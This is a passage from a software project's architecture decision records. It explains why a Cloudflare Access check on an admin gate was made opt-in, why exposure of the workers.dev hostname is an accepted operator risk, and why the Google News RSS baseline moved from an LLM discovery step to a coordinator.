**Decision:** The admin gate (`requireAdminSession` in `src/middleware/admin-auth.ts`) treats Cloudflare Access as an opt-in additive perimeter. The Cloudflare Access assertion check (Layer 0) enforces only when `env.CF_ACCESS_AUD` is configured. When `CF_ACCESS_AUD` is unset, Layer 0 is skipped entirely and admin is gated by Layer A (signed-in worker session) plus Layer B (`ADMIN_EMAIL` match) alone. REQ-AUTH-001 AC 8 was rewritten on the same day to describe the new opt-in policy in user-observable terms; this ADR documents the architectural decision behind that AC change.

**Context:** The original three-layer admin gate (CF-001) made `Cf-Access-Jwt-Assertion` mandatory regardless of configuration. Integration deploys without Cloudflare Access bound in front of the worker therefore had admin permanently unreachable: the header is never present, so Layer 1 always rejected with 401 and the operator could not trigger `/api/admin/force-refresh` even when authenticated as the configured `ADMIN_EMAIL`. The same pattern blocks any fork that runs without an Access zone (cost, complexity, or simply not needed at small scale).

**Alternatives considered:**

- **Keep CF Access mandatory; require operators to bind Access on every environment.** Rejected — forces a Zero Trust deploy as a prerequisite for using force-refresh, even on isolated test/staging instances where the perimeter is not warranted. Increases setup friction for forks.
- **Hard-coded dev bypass via `DEV_BYPASS_TOKEN` for admin routes.** Rejected — `/api/dev/trigger-scrape` already exists for unattended pipeline drives, but threading a bypass into the admin middleware confuses the auth model and forks the policy across two paths. Keeping admin policy declarative (one env var) is cleaner.
- **Require `CF_ACCESS_AUD` to be set even in environments without Access.** Rejected — that conflates "perimeter configured" (operator decision) with "perimeter enforced server-side" (code policy). The two should be coupled: setting the var IS the way the operator opts into perimeter enforcement.

**Rationale:** ADMIN_EMAIL gating + signed-in OAuth session is sufficient as the baseline admin policy. CF Access is a defence-in-depth perimeter that an operator may add when the security profile warrants it (production, larger deployments). Coupling Layer 0 enforcement to `CF_ACCESS_AUD` presence makes the opt-in explicit: setting the var means the operator has bound Access in front and wants the worker to verify the JWT's `aud` claim; clearing the var means the worker should not assume Access is present and should not reject on its absence.

**Consequences:**

- Production deploys with Access bound MUST set `CF_ACCESS_AUD` AND must satisfy AD30 (Access bound to the `*.workers.dev` URL too, or that subdomain disabled). Without both, the perimeter is forgeable from anywhere on the public internet and admin reduces to ADMIN_EMAIL alone.
- Integration and forks without Access keep `CF_ACCESS_AUD` unset and rely on session + ADMIN_EMAIL.
- Discovery retry endpoints (`/api/admin/discovery/*`) inherit the same gate. Their existing tests pass an opaque assertion value that is now ignored unless `CF_ACCESS_AUD` is set in the test env — no behaviour change there.
- Future review passes that grep the admin path for unconditional Cloudflare Access enforcement should match this ADR's `Overrides:` line and not flag the conditional check as a missing perimeter.

**Related requirements:** REQ-AUTH-001 AC 8.

---

### AD30: `*.workers.dev` perimeter coverage is the operator's responsibility — accepted risk

**Status:** Accepted (2026-05-05)
**Overrides:** workers-dev-exposure:REQ-AUTH-001

**Decision:** Whether the auto-assigned `*.workers.dev` subdomain sits behind Cloudflare Access is the operator's responsibility, not the worker's. The application code does NOT detect the request host or reject `workers.dev` traffic, and reviewers MUST NOT flag this as a perimeter gap. When an operator binds Access on the custom domain they are expected to also bind it on the `workers.dev` hostname (or disable that hostname) at the Cloudflare dashboard; failing to do so is an accepted risk owned by the operator.

**Related requirements:** REQ-AUTH-001 AC 8.

---

### AD31: Google News baseline ownership lives at the coordinator, not in discovery

**Status:** Accepted (2026-05-06)

**Decision:** The per-tag Google News query-RSS baseline is owned by the coordinator (REQ-PIPE-001 AC 9), which synthesises a GN source for every tag in the union of (defaults ∪ curated ∪ discovered KV) on every tick. The discovery LLM (REQ-DISC-001 AC 3) is the legacy producer of the same kind of URL, written once into KV `sources:{tag}` for tags without a first-party feed; its prompt instruction to emit a Google News fallback is now redundant. Discovery LLM should be retrained on first-party sources only in a follow-up pass; until then both paths coexist and the prefer-direct-source pass absorbs any minor overlap.

**Context:** Two independent code paths produce a Google News query-RSS source for the same tag. The discovery-LLM path persists per-tag once at first discovery. The coordinator-baseline path synthesises every tick. A discovered non-curated tag without a first-party feed therefore fans out a GN query twice — once via the KV-cached discovery URL, once via coordinator synthesis. The query strings differ slightly (LLM-crafted phrasing vs. tag-with-dashes-as-spaces), so canonical-URL dedup may miss the overlap; the prefer-direct-source pass cleans up downstream when a direct copy lands in the same tick. This was flagged as an unresolved architectural question in the PR #201 review.

**Alternatives considered:**

- **Discovery owns GN, coordinator skips tags whose KV entry already contains GN** — rejected. Discovery runs once per tag at settings save; the KV cache can drift if a tag's needs change. Centralising GN at the coordinator means the baseline is recomputed every tick from the live tag union.
- **Both paths coexist permanently** — rejected as a stable end-state. The redundant fan-out wastes a small amount of LLM and fetch budget and complicates future debugging when a GN URL turns out to be wrong (which path produced it?).

**Rationale:** The coordinator already owns the per-tick source list; making it the single owner of the GN baseline matches the "coordinator decides which sources fan out" concept. Discovery's job becomes "find first-party feeds for this tag" — a narrower, more useful prompt that should produce better results. Keeping the legacy LLM-emitted GN fallback as a transitional state avoids a same-PR rewrite of the discovery prompt and its tests.

**Consequences:**

- REQ-PIPE-001 AC 9 is the canonical home of GN baseline behaviour; reviewers MUST NOT flag the discovery LLM's GN fallback as a missing capability — it is intentionally redundant during the transition.
- A follow-up issue should retrain the discovery LLM prompt on first-party sources only and remove the GN fallback instruction. Until then, the existing KV entries continue to fan out and the coordinator-baseline pass absorbs the duplicate.
- The aggregator-vs-direct dedup pass continues to absorb GN-vs-direct overlap as it does today; no new behaviour is required of it.

**Related requirements:** REQ-PIPE-001 AC 9, REQ-DISC-001 AC 3.

---

## Related Documentation

- [Architecture](../architecture.md) — System overview and component map
- [Configuration](../configuration.md) — Env vars, bindings, KV key conventions

---
